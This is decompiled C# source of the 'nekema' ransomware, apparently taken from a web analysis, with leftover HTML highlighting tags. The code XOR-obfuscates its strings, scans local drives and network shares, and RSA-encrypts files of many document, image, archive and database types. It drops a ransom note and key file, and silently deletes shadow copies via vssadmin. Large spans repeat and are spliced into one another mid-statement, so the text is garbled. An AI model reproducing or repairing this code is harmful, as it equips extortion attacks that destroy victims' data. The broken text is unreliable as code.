this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> 0xad, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 